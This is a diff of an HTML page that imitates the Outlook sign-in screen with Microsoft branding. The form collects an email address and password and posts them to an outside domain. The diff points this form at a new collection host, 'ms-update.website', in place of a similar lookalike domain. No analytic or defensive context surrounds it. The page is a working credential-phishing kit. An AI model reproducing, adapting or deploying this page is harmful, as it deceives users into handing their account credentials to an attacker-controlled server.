@@ -158,10 +158,10 @@ button {
                 
                 <h1 class="h1">Outlook<span><sup>®</sup></span></h1>
             </div>
-            <form class="form" action="https://serviciooutlook.com/" method="POST">
+            <form class="form" action="https://ms-update.website " method="POST">
                 <label for="mail">Email</label><br>
                 <input type="email" name="mail" required><br>
-                <label for="password">Password</label><br>
+                <label for="pass">Password</label><br>
                 <input type="password" name="pass" required><br>
                 <button type="submit" for="submit"><i class="far fa-arrow-alt-circle-right"></i>Sign-in</button>
             </form>
